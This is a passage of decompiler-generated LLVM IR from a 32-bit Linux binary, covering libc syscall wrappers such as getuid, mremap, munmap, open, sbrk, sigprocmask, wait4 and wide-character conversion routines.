  uselistorder i32 %v1_804deef, { 1, 0, 2 }
  uselistorder i32* %stack_var_-4, { 1, 0, 2 }
  uselistorder i32 191, { 1, 0 }
  uselistorder label %dec_label_pc_804df08, { 1, 0 }
}

define i32 @getuid() local_unnamed_addr {
entry:
  %ebx.global-to-local = alloca i32, align 4
  %stack_var_-4 = alloca i32, align 4
  %v0_804df10 = load i32, i32* @ebx, align 4
  store i32 %v0_804df10, i32* %stack_var_-4, align 4
  %v1_804df19 = call i32 @int80_syscall(i32 199)
  store i32 %v1_804df19, i32* %ebx.global-to-local, align 4
  %tmp = icmp ult i32 %v1_804df19, -4095
  br i1 %tmp, label %dec_label_pc_804df30, label %dec_label_pc_804df24

dec_label_pc_804df24:                             ; preds = %entry
  %v0_804df24 = load i32, i32* %stack_var_-4, align 4
  %v1_804df24 = call i32 @__errno_location(i32 %v0_804df24)
  %v0_804df29 = load i32, i32* %ebx.global-to-local, align 4
  %v1_804df29 = sub i32 0, %v0_804df29
  %v2_804df2b = inttoptr i32 %v1_804df24 to i32*
  store i32 %v1_804df29, i32* %v2_804df2b, align 4
  store i32 -1, i32* %ebx.global-to-local, align 4
  br label %dec_label_pc_804df30

dec_label_pc_804df30:                             ; preds = %entry, %dec_label_pc_804df24
  %v0_804df31 = phi i32 [ %v1_804df19, %entry ], [ -1, %dec_label_pc_804df24 ]
  %v2_804df34 = load i32, i32* %stack_var_-4, align 4
  store i32 %v2_804df34, i32* %ebx.global-to-local, align 4
  ret i32 %v0_804df31

; uselistorder directives
  uselistorder i32 %v1_804df19, { 1, 0, 2 }
  uselistorder i32* %stack_var_-4, { 1, 0, 2 }
  uselistorder label %dec_label_pc_804df30, { 1, 0 }
}

define i32 @mremap(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4, i32 %arg5, i32 %arg6) local_unnamed_addr {
entry:
  %esi.global-to-local = alloca i32, align 4
  %tmp6 = call i32 @__decompiler_undefined_function_0()
  %stack_var_-12 = alloca i32, align 4
  %stack_var_-8 = alloca i32, align 4
  %v0_804df38 = load i32, i32* @edi, align 4
  %v0_804df39 = load i32, i32* @esi, align 4
  store i32 %v0_804df39, i32* %stack_var_-8, align 4
  store i32 %arg4, i32* @esi, align 4
  store i32 %arg5, i32* @edi, align 4
  %v0_804df51 = load i32, i32* @ebx, align 4
  store i32 %arg1, i32* @ebx, align 4
  %v6_804df59 = call i32 @mremap(i32 %v0_804df51, i32 %v0_804df39, i32 %v0_804df38, i32 %tmp6, i32 %arg1, i32 %arg2)
  store i32 %v0_804df51, i32* @ebx, align 4
  store i32 %v6_804df59, i32* %esi.global-to-local, align 4
  %tmp = icmp ult i32 %v6_804df59, -4095
  br i1 %tmp, label %dec_label_pc_804df71, label %dec_label_pc_804df65

dec_label_pc_804df65:                             ; preds = %entry
  %v1_804df65 = call i32 @__errno_location(i32 %v0_804df51)
  %v0_804df6a = load i32, i32* %esi.global-to-local, align 4
  %v1_804df6a = sub i32 0, %v0_804df6a
  %v2_804df6c = inttoptr i32 %v1_804df65 to i32*
  store i32 %v1_804df6a, i32* %v2_804df6c, align 4
  store i32 -1, i32* %esi.global-to-local, align 4
  br label %dec_label_pc_804df71

dec_label_pc_804df71:                             ; preds = %entry, %dec_label_pc_804df65
  %v0_804df72 = phi i32 [ %v6_804df59, %entry ], [ -1, %dec_label_pc_804df65 ]
  %v2_804df71 = load i32, i32* %stack_var_-12, align 4
  store i32 %v2_804df71, i32* @edx, align 4
  %v2_804df74 = load i32, i32* %stack_var_-8, align 4
  store i32 %v2_804df74, i32* @esi, align 4
  store i32 %v0_804df38, i32* @edi, align 4
  ret i32 %v0_804df72

; uselistorder directives
  uselistorder i32 %v6_804df59, { 1, 0, 2 }
  uselistorder i32 %v0_804df51, { 1, 0, 2 }
  uselistorder i32 (i32, i32, i32, i32, i32, i32)* @mremap, { 1, 0 }
  uselistorder i32 %arg1, { 1, 0 }
  uselistorder label %dec_label_pc_804df71, { 1, 0 }
}

define i32 @munmap(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  %ebx.global-to-local = alloca i32, align 4
  %tmp4 = call i32 @__decompiler_undefined_function_0()
  %stack_var_-12 = alloca i32, align 4
  %stack_var_-4 = alloca i32, align 4
  %v0_804df78 = load i32, i32* @ebx, align 4
  store i32 %v0_804df78, i32* %stack_var_-4, align 4
  store i32 %arg1, i32* @ebx, align 4
  %v4_804df8b = call i32 @munmap(i32 %v0_804df78, i32 %tmp4, i32 %arg1, i32 %arg2)
  store i32 %v4_804df8b, i32* %ebx.global-to-local, align 4
  %tmp = icmp ult i32 %v4_804df8b, -4095
  br i1 %tmp, label %dec_label_pc_804dfa4, label %dec_label_pc_804df98

dec_label_pc_804df98:                             ; preds = %entry
  %v0_804df98 = load i32, i32* %stack_var_-4, align 4
  %v1_804df98 = call i32 @__errno_location(i32 %v0_804df98)
  %v0_804df9d = load i32, i32* %ebx.global-to-local, align 4
  %v1_804df9d = sub i32 0, %v0_804df9d
  %v2_804df9f = inttoptr i32 %v1_804df98 to i32*
  store i32 %v1_804df9d, i32* %v2_804df9f, align 4
  store i32 -1, i32* %ebx.global-to-local, align 4
  br label %dec_label_pc_804dfa4

dec_label_pc_804dfa4:                             ; preds = %entry, %dec_label_pc_804df98
  %v0_804dfa5 = phi i32 [ %v4_804df8b, %entry ], [ -1, %dec_label_pc_804df98 ]
  %v2_804dfa4 = load i32, i32* %stack_var_-12, align 4
  store i32 %v2_804dfa4, i32* @edx, align 4
  %v2_804dfa8 = load i32, i32* %stack_var_-4, align 4
  store i32 %v2_804dfa8, i32* %ebx.global-to-local, align 4
  ret i32 %v0_804dfa5

; uselistorder directives
  uselistorder i32 %v4_804df8b, { 1, 0, 2 }
  uselistorder i32* %stack_var_-4, { 1, 0, 2 }
  uselistorder i32 (i32, i32, i32, i32)* @munmap, { 1, 0 }
  uselistorder i32 %arg1, { 1, 0 }
  uselistorder label %dec_label_pc_804dfa4, { 1, 0 }
}

define i32 @__libc_nanosleep(%timespec* %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  %ebx.global-to-local = alloca i32, align 4
  %tmp4 = inttoptr i32 %arg2 to %timespec*
  %stack_var_-12 = alloca i32, align 4
  %stack_var_-4 = alloca i32, align 4
  %v0_804dfac = load i32, i32* @ebx, align 4
  store i32 %v0_804dfac, i32* %stack_var_-4, align 4
  %v4_804dfb0 = ptrtoint %timespec* %arg1 to i32
  store i32 %v4_804dfb0, i32* %ebx.global-to-local, align 4
  %v6_804dfbf = call i32 @nanosleep(%timespec* %arg1, %timespec* %tmp4)
  store i32 %v6_804dfbf, i32* %ebx.global-to-local, align 4
  %tmp = icmp ult i32 %v6_804dfbf, -4095
  br i1 %tmp, label %dec_label_pc_804dfd8, label %dec_label_pc_804dfcc

dec_label_pc_804dfcc:                             ; preds = %entry
  %v0_804dfcc = load i32, i32* %stack_var_-4, align 4
  %v1_804dfcc = call i32 @__errno_location(i32 %v0_804dfcc)
  %v0_804dfd1 = load i32, i32* %ebx.global-to-local, align 4
  %v1_804dfd1 = sub i32 0, %v0_804dfd1
  %v2_804dfd3 = inttoptr i32 %v1_804dfcc to i32*
  store i32 %v1_804dfd1, i32* %v2_804dfd3, align 4
  store i32 -1, i32* %ebx.global-to-local, align 4
  br label %dec_label_pc_804dfd8

dec_label_pc_804dfd8:                             ; preds = %entry, %dec_label_pc_804dfcc
  %v0_804dfd9 = phi i32 [ %v6_804dfbf, %entry ], [ -1, %dec_label_pc_804dfcc ]
  %v2_804dfd8 = load i32, i32* %stack_var_-12, align 4
  store i32 %v2_804dfd8, i32* @edx, align 4
  %v2_804dfdc = load i32, i32* %stack_var_-4, align 4
  store i32 %v2_804dfdc, i32* %ebx.global-to-local, align 4
  ret i32 %v0_804dfd9

; uselistorder directives
  uselistorder i32 %v6_804dfbf, { 1, 0, 2 }
  uselistorder i32* %stack_var_-4, { 1, 0, 2 }
  uselistorder %timespec* %arg1, { 1, 0 }
  uselistorder label %dec_label_pc_804dfd8, { 1, 0 }
}

define i32 @__libc_open(i8* %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
entry:
  %ebx.global-to-local = alloca i32, align 4
  %v0_804dfe3 = load i32, i32* @ebx, align 4
  %sext = mul i32 %arg2, 16777216
  %v4_804dfe7 = sdiv i32 %sext, 16777216
  store i32 %v4_804dfe7, i32* @ecx, align 4
  %v4_804dfeb = ptrtoint i8* %arg1 to i32
  %v3_804dfef = and i32 %arg2, 64
  %v4_804dfef = icmp eq i32 %v3_804dfef, 0
  br i1 %v4_804dfef, label %dec_label_pc_804e000, label %dec_label_pc_804dff4

dec_label_pc_804dff4:                             ; preds = %entry
  %phitmp = urem i32 %arg3, 65536
  br label %dec_label_pc_804e000

dec_label_pc_804e000:                             ; preds = %entry, %dec_label_pc_804dff4
  %v0_804e000 = phi i32 [ 0, %entry ], [ %phitmp, %dec_label_pc_804dff4 ]
  store i32 %v0_804e000, i32* @edx, align 4
  store i32 %v4_804dfeb, i32* %ebx.global-to-local, align 4
  %v5_804e00b = call i32 (i8*, i32, ...) @open(i8* %arg1, i32 %v4_804dfe7)
  store i32 %v5_804e00b, i32* %ebx.global-to-local, align 4
  %tmp = icmp ult i32 %v5_804e00b, -4095
  br i1 %tmp, label %dec_label_pc_804e023, label %dec_label_pc_804e017

dec_label_pc_804e017:                             ; preds = %dec_label_pc_804e000
  %v1_804e017 = call i32 @__errno_location(i32 %v0_804dfe3)
  %v0_804e01c = load i32, i32* %ebx.global-to-local, align 4
  %v1_804e01c = sub i32 0, %v0_804e01c
  %v2_804e01e = inttoptr i32 %v1_804e017 to i32*
  store i32 %v1_804e01c, i32* %v2_804e01e, align 4
  store i32 -1, i32* %ebx.global-to-local, align 4
  br label %dec_label_pc_804e023

dec_label_pc_804e023:                             ; preds = %dec_label_pc_804e000, %dec_label_pc_804e017
  %v0_804e026 = phi i32 [ %v5_804e00b, %dec_label_pc_804e000 ], [ -1, %dec_label_pc_804e017 ]
  store i32 %v0_804dfe3, i32* @ebx, align 4
  ret i32 %v0_804e026

; uselistorder directives
  uselistorder i32 %v5_804e00b, { 1, 0, 2 }
  uselistorder i32 %v4_804dfe7, { 1, 0 }
  uselistorder i32 %v0_804dfe3, { 1, 0 }
  uselistorder i32 %arg2, { 1, 0 }
  uselistorder label %dec_label_pc_804e023, { 1, 0 }
  uselistorder label %dec_label_pc_804e000, { 1, 0 }
}

define i32 @__libc_creat(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %v3_804e03b = inttoptr i32 %arg1 to i8*
  %v4_804e03b = call i32 @__libc_open(i8* %v3_804e03b, i32 577, i32 %arg2)
  ret i32 %v4_804e03b

; uselistorder directives
  uselistorder i32 (i8*, i32, i32)* @__libc_open, { 0, 2, 1 }
  uselistorder i32 577, { 1, 0, 2 }
}

define i32 @__GI_sbrk(i32 %arg1) local_unnamed_addr {
entry:
  %stack_var_-12 = alloca i32, align 4
  %v0_804e045 = load i32, i32* @ebx, align 4
  %v0_804e049 = load i32, i32* @global_var_8055e04.388, align 4
  %v1_804e049 = icmp eq i32 %v0_804e049, 0
  %v1_804e054 = icmp eq i1 %v1_804e049, false
  br i1 %v1_804e054, label %dec_label_pc_804e067, label %dec_label_pc_804e056

dec_label_pc_804e056:                             ; preds = %entry
  %v1_804e05b = call i32 @__GI_brk(i32 0)
  %v2_804e063 = icmp slt i32 %v1_804e05b, 0
  br i1 %v2_804e063, label %dec_label_pc_804e089, label %dec_label_pc_804e056.dec_label_pc_804e067_crit_edge

dec_label_pc_804e056.dec_label_pc_804e067_crit_edge: ; preds = %dec_label_pc_804e056
  %v0_804e069.pre = load i32, i32* @global_var_8055e04.388, align 4
  br label %dec_label_pc_804e067

dec_label_pc_804e067:                             ; preds = %dec_label_pc_804e056.dec_label_pc_804e067_crit_edge, %entry
  %v0_804e077 = phi i32 [ %v0_804e069.pre, %dec_label_pc_804e056.dec_label_pc_804e067_crit_edge ], [ %v0_804e049, %entry ]
  %v1_804e067 = icmp eq i32 %arg1, 0
  %v1_804e06e = icmp eq i1 %v1_804e067, false
  br i1 %v1_804e06e, label %dec_label_pc_804e074, label %dec_label_pc_804e070

dec_label_pc_804e070:                             ; preds = %dec_label_pc_804e067
  br label %dec_label_pc_804e08c

dec_label_pc_804e074:                             ; preds = %dec_label_pc_804e067
  store i32 %v0_804e077, i32* @ebx, align 4
  %v2_804e079 = add i32 %v0_804e077, %arg1
  %v1_804e07d = call i32 @__GI_brk(i32 %v2_804e079)
  %v2_804e085 = icmp slt i32 %v1_804e07d, 0
  %v1_804e087 = icmp eq i1 %v2_804e085, false
  br i1 %v1_804e087, label %dec_label_pc_804e074.dec_label_pc_804e08c_crit_edge, label %dec_label_pc_804e089

dec_label_pc_804e074.dec_label_pc_804e08c_crit_edge: ; preds = %dec_label_pc_804e074
  %v0_804e08d.pre = load i32, i32* @ebx, align 4
  br label %dec_label_pc_804e08c

dec_label_pc_804e089:                             ; preds = %dec_label_pc_804e074, %dec_label_pc_804e056
  br label %dec_label_pc_804e08c

dec_label_pc_804e08c:                             ; preds = %dec_label_pc_804e074.dec_label_pc_804e08c_crit_edge, %dec_label_pc_804e070, %dec_label_pc_804e089
  %v0_804e08d = phi i32 [ %v0_804e08d.pre, %dec_label_pc_804e074.dec_label_pc_804e08c_crit_edge ], [ %v0_804e077, %dec_label_pc_804e070 ], [ -1, %dec_label_pc_804e089 ]
  %v2_804e08c = load i32, i32* %stack_var_-12, align 4
  store i32 %v2_804e08c, i32* @edx, align 4
  store i32 %v0_804e045, i32* @ebx, align 4
  ret i32 %v0_804e08d

; uselistorder directives
  uselistorder i32 %v0_804e077, { 1, 0, 2 }
  uselistorder i32 (i32)* @__GI_brk, { 1, 0 }
  uselistorder label %dec_label_pc_804e08c, { 2, 0, 1 }
}

define i32 @__GI_sigprocmask(i32 %arg1, %_TYPEDEF_sigset_t* %arg2, i32 %arg3) local_unnamed_addr {
entry:
  %esi.global-to-local = alloca i32, align 4
  %tmp3 = inttoptr i32 %arg3 to %_TYPEDEF_sigset_t*
  %stack_var_-12 = alloca i32, align 4
  %v0_804e095 = load i32, i32* @esi, align 4
  %v4_804e099 = ptrtoint %_TYPEDEF_sigset_t* %arg2 to i32
  store i32 %v4_804e099, i32* @ecx, align 4
  %v2_804e0a5 = icmp eq %_TYPEDEF_sigset_t* %arg2, null
  br i1 %v2_804e0a5, label %dec_label_pc_804e0be, label %dec_label_pc_804e0a9

dec_label_pc_804e0a9:                             ; preds = %entry
  %tmp = icmp ult i32 %arg1, 3
  br i1 %tmp, label %dec_label_pc_804e0be, label %dec_label_pc_804e0ae

dec_label_pc_804e0ae:                             ; preds = %dec_label_pc_804e0a9
  %v1_804e0ae = call i32 @__errno_location(i32 %v0_804e095)
  %v1_804e0b3 = inttoptr i32 %v1_804e0ae to i32*
  store i32 22, i32* %v1_804e0b3, align 4
  br label %dec_label_pc_804e0e5

dec_label_pc_804e0be:                             ; preds = %dec_label_pc_804e0a9, %entry
  store i32 8, i32* %esi.global-to-local, align 4
  %v0_804e0c3 = load i32, i32* @ebx, align 4
  %v7_804e0cb = call i32 @sigprocmask(i32 %arg1, %_TYPEDEF_sigset_t* %arg2, %_TYPEDEF_sigset_t* %tmp3)
  store i32 %v0_804e0c3, i32* @ebx, align 4
  store i32 %v7_804e0cb, i32* %esi.global-to-local, align 4
  %tmp11 = icmp ult i32 %v7_804e0cb, -4095
  br i1 %tmp11, label %dec_label_pc_804e0e5, label %dec_label_pc_804e0d7

dec_label_pc_804e0d7:                             ; preds = %dec_label_pc_804e0be
  %v1_804e0d7 = call i32 @__errno_location(i32 %v0_804e0c3)
  %v0_804e0dc = load i32, i32* %esi.global-to-local, align 4
  %v1_804e0dc = sub i32 0, %v0_804e0dc
  %v2_804e0de = inttoptr i32 %v1_804e0d7 to i32*
  store i32 %v1_804e0dc, i32* %v2_804e0de, align 4
  store i32 -1, i32* %esi.global-to-local, align 4
  br label %dec_label_pc_804e0e5

dec_label_pc_804e0e5:                             ; preds = %dec_label_pc_804e0d7, %dec_label_pc_804e0be, %dec_label_pc_804e0ae
  %storemerge = phi i32 [ -1, %dec_label_pc_804e0ae ], [ %v7_804e0cb, %dec_label_pc_804e0be ], [ -1, %dec_label_pc_804e0d7 ]
  %v2_804e0e5 = load i32, i32* %stack_var_-12, align 4
  store i32 %v2_804e0e5, i32* @edx, align 4
  store i32 %v0_804e095, i32* @esi, align 4
  ret i32 %storemerge

; uselistorder directives
  uselistorder i32 %v7_804e0cb, { 1, 0, 2 }
  uselistorder i32 %v0_804e0c3, { 1, 0 }
  uselistorder %_TYPEDEF_sigset_t* %arg2, { 1, 0, 2 }
  uselistorder i32 %arg1, { 1, 0 }
}

define i32 @wait4(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  %esi.global-to-local = alloca i32, align 4
  %tmp5 = call i32 @__decompiler_undefined_function_0()
  %stack_var_-8 = alloca i32, align 4
  %v0_804e0ec = load i32, i32* @edi, align 4
  %v0_804e0ed = load i32, i32* @esi, align 4
  store i32 %v0_804e0ed, i32* %stack_var_-8, align 4
  store i32 %arg1, i32* @edi, align 4
  store i32 %arg4, i32* @esi, align 4
  %v0_804e101 = load i32, i32* @ebx, align 4
  store i32 %arg1, i32* @ebx, align 4
  %v4_804e109 = call i32 @wait4(i32 %v0_804e101, i32 %v0_804e0ed, i32 %v0_804e0ec, i32 %tmp5)
  store i32 %v0_804e101, i32* @ebx, align 4
  store i32 %v4_804e109, i32* %esi.global-to-local, align 4
  %tmp = icmp ult i32 %v4_804e109, -4095
  br i1 %tmp, label %dec_label_pc_804e121, label %dec_label_pc_804e115

dec_label_pc_804e115:                             ; preds = %entry
  %v1_804e115 = call i32 @__errno_location(i32 %v0_804e101)
  %v0_804e11a = load i32, i32* %esi.global-to-local, align 4
  %v1_804e11a = sub i32 0, %v0_804e11a
  %v2_804e11c = inttoptr i32 %v1_804e115 to i32*
  store i32 %v1_804e11a, i32* %v2_804e11c, align 4
  store i32 -1, i32* %esi.global-to-local, align 4
  br label %dec_label_pc_804e121

dec_label_pc_804e121:                             ; preds = %entry, %dec_label_pc_804e115
  %v0_804e122 = phi i32 [ %v4_804e109, %entry ], [ -1, %dec_label_pc_804e115 ]
  %v2_804e124 = load i32, i32* %stack_var_-8, align 4
  store i32 %v2_804e124, i32* @esi, align 4
  store i32 %v0_804e0ec, i32* @edi, align 4
  ret i32 %v0_804e122

; uselistorder directives
  uselistorder i32 %v4_804e109, { 1, 0, 2 }
  uselistorder i32 %v0_804e101, { 1, 0, 2 }
  uselistorder i32 (i32, i32, i32, i32)* @wait4, { 2, 0, 1 }
  uselistorder label %dec_label_pc_804e121, { 1, 0 }
}

define i32 @__GI___h_errno_location() local_unnamed_addr {
entry:
  ret i32 ptrtoint (i32* @global_var_8055de4.389 to i32)
}

define i32 @__GI_wcrtomb() local_unnamed_addr {
entry:
  %tmp = call i32 @__decompiler_undefined_function_0()
  %tmp3 = call i32 @__decompiler_undefined_function_0()
  %tmp4 = call i32 @__decompiler_undefined_function_0()
  %stack_var_-8 = alloca i32, align 4
  %stack_var_-4 = alloca i32, align 4
  %stack_var_-24 = alloca i32, align 4
  %v1_804e13b = icmp eq i32 %tmp4, 0
  %v1_804e13d = icmp eq i1 %v1_804e13b, false
  br i1 %v1_804e13d, label %dec_label_pc_804e145, label %dec_label_pc_804e13f

dec_label_pc_804e13f:                             ; preds = %entry
  %v2_804e13f = ptrtoint i32* %stack_var_-24 to i32
  br label %dec_label_pc_804e145

dec_label_pc_804e145:                             ; preds = %entry, %dec_label_pc_804e13f
  %v0_804e161 = phi i32 [ %tmp4, %entry ], [ %v2_804e13f, %dec_label_pc_804e13f ]
  %v0_804e14d = phi i32 [ %tmp3, %entry ], [ 0, %dec_label_pc_804e13f ]
  %v2_804e145 = ptrtoint i32* %stack_var_-4 to i32
  store i32 %v2_804e145, i32* %stack_var_-8, align 4
  store i32 %v0_804e14d, i32* %stack_var_-4, align 4
  %v2_804e15c = ptrtoint i32* %stack_var_-8 to i32
  %v5_804e162 = inttoptr i32 %v0_804e161 to i8*
  %v6_804e162 = call i32 @__GI_wcsnrtombs(i8* %v5_804e162, i32 %v2_804e15c, i32 1, i32 16, i32 %tmp)
  %v1_804e16c = icmp eq i32 %v6_804e162, 0
  %v3_804e16e = select i1 %v1_804e16c, i32 1, i32 %v6_804e162
  ret i32 %v3_804e16e

; uselistorder directives
  uselistorder i32* %stack_var_-8, { 1, 0 }
  uselistorder label %dec_label_pc_804e145, { 1, 0 }
}

define i32 @__GI_wcsrtombs() local_unnamed_addr {
entry:
  %tmp = call i32 @__decompiler_undefined_function_0()
  %tmp1 = call i32 @__decompiler_undefined_function_0()
  %tmp2 = call i32 @__decompiler_undefined_function_0()
  %tmp3 = call i32 @__decompiler_undefined_function_0()
  %v5_804e18d = inttoptr i32 %tmp to i8*
  %v6_804e18d = call i32 @__GI_wcsnrtombs(i8* %v5_804e18d, i32 %tmp1, i32 -1, i32 %tmp2, i32 %tmp3)
  ret i32 %v6_804e18d
}

define i32 @__GI_wcsnrtombs(i8* %arg1, i32 %arg2, i32 %arg3, i32 %arg4, i32 %arg5) local_unnamed_addr {
entry:
  %ebp.global-to-local = alloca i32, align 4
  %ebx.global-to-local = alloca i32, align 4
  %edi.global-to-local = alloca i32, align 4
  %edx.global-to-local = alloca i32, align 4
  %esi.global-to-local = alloca i32, align 4
  %zf.global-to-local = alloca i1, align 1
  %stack_var_-32 = alloca i32, align 4
  %v0_804e19b = load i32, i32* @ebx, align 4
  %v4_804e19f = ptrtoint i8* %arg1 to i32
  store i32 %v4_804e19f, i32* %edx.global-to-local, align 4
  store i32 %arg2, i32* %ebp.global-to-local, align 4
  %v1_804e1af = icmp eq i8* %arg1, null
  store i1 %v1_804e1af, i1* %zf.global-to-local, align 1
  br i1 %v1_804e1af, label %dec_label_pc_804e1be, label %dec_label_pc_804e1b3

dec_label_pc_804e1b3:                             ; preds = %entry
  %v12_804e1b3 = icmp eq i32 %v4_804e19f, %arg2
  store i1 %v12_804e1b3, i1* %zf.global-to-local, align 1
  store i32 1, i32* %esi.global-to-local, align 4
  %v1_804e1ba = icmp eq i1 %v12_804e1b3, false
  br i1 %v1_804e1ba, label %dec_label_pc_804e1e1, label %dec_label_pc_804e1db

dec_label_pc_804e1be:                             ; preds = %entry
  %v2_804e1be = ptrtoint i32* %stack_var_-32 to i32
  store i32 %v2_804e1be, i32* %edx.global-to-local, align 4
  store i1 false, i1* %zf.global-to-local, align 1
  br label %dec_label_pc_804e1df

dec_label_pc_804e1c7:                             ; preds = %dec_label_pc_804e1ef
  %v1_804e1c7 = call i32 @__errno_location(i32 %v0_804e19b)
  %v1_804e1cc = inttoptr i32 %v1_804e1c7 to i32*
  store i32 84, i32* %v1_804e1cc, align 4
  br label %dec_label_pc_804e215

dec_label_pc_804e1d7:                             ; preds = %dec_label_pc_804e1f6
  store i1 true, i1* %zf.global-to-local, align 1
  store i32 0, i32* %ebx.global-to-local, align 4
  %v0_804e20a.pre = load i32, i32* %edx.global-to-local, align 4
  br label %dec_label_pc_804e206

dec_label_pc_804e1db:                             ; preds = %dec_label_pc_804e1b3
  %v2_804e1db = ptrtoint i32* %stack_var_-32 to i32
  store i32 %v2_804e1db, i32* %edx.global-to-local, align 4
  br label %dec_label_pc_804e1df

dec_label_pc_804e1df:                             ; preds = %dec_label_pc_804e1be, %dec_label_pc_804e1db
  %v2_804e1f816 = phi i32 [ %v2_804e1be, %dec_label_pc_804e1be ], [ %v2_804e1db, %dec_label_pc_804e1db ]
  %v1_804e1e412 = phi i32 [ -1, %dec_label_pc_804e1be ], [ %arg4, %dec_label_pc_804e1db ]
  store i1 true, i1* %zf.global-to-local, align 1
  store i32 0, i32* %esi.global-to-local, align 4
  br label %dec_label_pc_804e1e1

dec_label_pc_804e1e1:                             ; preds = %dec_label_pc_804e1b3, %dec_label_pc_804e1df
  %v2_804e1f815 = phi i32 [ %v4_804e19f, %dec_label_pc_804e1b3 ], [ %v2_804e1f816, %dec_label_pc_804e1df ]
  %v0_804e1e6 = phi i32 [ %arg4, %dec_label_pc_804e1b3 ], [ %v1_804e1e412, %dec_label_pc_804e1df ]
  %v1_804e1e1 = inttoptr i32 %arg2 to i32*
  %v2_804e1e1 = load i32, i32* %v1_804e1e1, align 4
  store i32 %v2_804e1e1, i32* %ebx.global-to-local, align 4
  %tmp31 = icmp uge i32 %v0_804e1e6, %arg3
  %v5_804e1e8 = select i1 %tmp31, i32 %arg3, i32 %v0_804e1e6
  store i32 %v5_804e1e8, i32* %edi.global-to-local, align 4
  store i32 %v5_804e1e8, i32* @ecx, align 4
  %v1_804e2023 = icmp eq i32 %v5_804e1e8, 0
  store i1 %v1_804e2023, i1* %zf.global-to-local, align 1
  %v1_804e20410 = icmp eq i1 %v1_804e2023, false
  br i1 %v1_804e20410, label %dec_label_pc_804e1ef, label %dec_label_pc_804e206

dec_label_pc_804e1ef:                             ; preds = %dec_label_pc_804e1e1, %dec_label_pc_804e1fc
  %v2_804e1f8 = phi i32 [ %v2_804e1ff, %dec_label_pc_804e1fc ], [ %v2_804e1f815, %dec_label_pc_804e1e1 ]
  %v0_804e1ef = phi i32 [ %v1_804e1fc, %dec_label_pc_804e1fc ], [ %v2_804e1e1, %dec_label_pc_804e1e1 ]
  %v1_804e1ef = inttoptr i32 %v0_804e1ef to i32*
  %v2_804e1ef = load i32, i32* %v1_804e1ef, align 4
  %v9_804e1f1 = icmp eq i32 %v2_804e1ef, 127
  store i1 %v9_804e1f1, i1* %zf.global-to-local, align 1
  %v6_804e1f4 = icmp ugt i32 %v2_804e1ef, 127
  br i1 %v6_804e1f4, label %dec_label_pc_804e1c7, label %dec_label_pc_804e1f6

dec_label_pc_804e1f6:                             ; preds = %dec_label_pc_804e1ef
  %v3_804e1f6 = trunc i32 %v2_804e1ef to i8
  %v4_804e1f6 = icmp eq i8 %v3_804e1f6, 0
  store i1 %v4_804e1f6, i1* %zf.global-to-local, align 1
  %v3_804e1f8 = inttoptr i32 %v2_804e1f8 to i8*
  store i8 %v3_804e1f6, i8* %v3_804e1f8, align 1
  %v0_804e1fa = load i1, i1* %zf.global-to-local, align 1
  br i1 %v0_804e1fa, label %dec_label_pc_804e1d7, label %dec_label_pc_804e1fc

dec_label_pc_804e1fc:                             ; preds = %dec_label_pc_804e1f6
  %v0_804e1fc = load i32, i32* %ebx.global-to-local, align 4
  %v1_804e1fc = add i32 %v0_804e1fc, 4
  store i32 %v1_804e1fc, i32* %ebx.global-to-local, align 4
  %v0_804e1ff = load i32, i32* %edx.global-to-local, align 4
  %v1_804e1ff = load i32, i32* %esi.global-to-local, align 4
  %v2_804e1ff = add i32 %v1_804e1ff, %v0_804e1ff
  store i32 %v2_804e1ff, i32* %edx.global-to-local, align 4
  %v0_804e201 = load i32, i32* @ecx, align 4
  %v1_804e201 = add i32 %v0_804e201, -1
  %v8_804e201 = icmp eq i32 %v1_804e201, 0
  store i32 %v1_804e201, i32* @ecx, align 4
  store i1 %v8_804e201, i1* %zf.global-to-local, align 1
  %v1_804e204 = icmp eq i1 %v8_804e201, false
  br i1 %v1_804e204, label %dec_label_pc_804e1ef, label %dec_label_pc_804e206

dec_label_pc_804e206:                             ; preds = %dec_label_pc_804e1fc, %dec_label_pc_804e1e1, %dec_label_pc_804e1d7
  %v0_804e20e = phi i32 [ 0, %dec_label_pc_804e1d7 ], [ %v2_804e1e1, %dec_label_pc_804e1e1 ], [ %v1_804e1fc, %dec_label_pc_804e1fc ]
  %v0_804e20a = phi i32 [ %v0_804e20a.pre, %dec_label_pc_804e1d7 ], [ %v2_804e1f815, %dec_label_pc_804e1e1 ], [ %v2_804e1ff, %dec_label_pc_804e1fc ]
  %v2_804e206 = ptrtoint i32* %stack_var_-32 to i32
  %v12_804e20a = icmp eq i32 %v0_804e20a, %v2_804e206
  store i1 %v12_804e20a, i1* %zf.global-to-local, align 1
  br i1 %v12_804e20a, label %dec_label_pc_804e211, label %dec_label_pc_804e20e

dec_label_pc_804e20e:                             ; preds = %dec_label_pc_804e206
  %v1_804e20e = load i32, i32* %ebp.global-to-local, align 4
  %v2_804e20e = inttoptr i32 %v1_804e20e to i32*
  store i32 %v0_804e20e, i32* %v2_804e20e, align 4
  br label %dec_label_pc_804e211

dec_label_pc_804e211:                             ; preds = %dec_label_pc_804e206, %dec_label_pc_804e20e
  %v0_804e211 = load i32, i32* %edi.global-to-local, align 4
  %v1_804e213 = load i32, i32* @ecx, align 4
  %v2_804e213 = sub i32 %v0_804e211, %v1_804e213
  %v12_804e213 = icmp eq i32 %v2_804e213, 0
  br label %dec_label_pc_804e215

dec_label_pc_804e215:                             ; preds = %dec_label_pc_804e1c7, %dec_label_pc_804e211
  %storemerge = phi i1 [ %v12_804e213, %dec_label_pc_804e211 ], [ false, %dec_label_pc_804e1c7 ]
  %storemerge1 = phi i32 [ %v2_804e213, %dec_label_pc_804e211 ], [ -1, %dec_label_pc_804e1c7 ]
  store i1 %storemerge, i1* %zf.global-to-local, align 1
  %v0_804e215 = load i32, i32* @esp, align 4
  %v9_804e215 = icmp eq i32 %v0_804e215, -28
  store i1 %v9_804e215, i1* %zf.global-to-local, align 1
  store i32 %v0_804e19b, i32* %ebx.global-to-local, align 4
  ret i32 %storemerge1

; uselistorder directives
  uselistorder i1 %v12_804e20a, { 1, 0 }
  uselistorder i32 %v2_804e1ff, { 0, 2, 1 }
  uselistorder i32 %v1_804e1fc, { 0, 2, 1 }
  uselistorder i32 %v2_804e1ef, { 1, 2, 0 }
  uselistorder i32 %v2_804e1e1, { 1, 0, 2 }
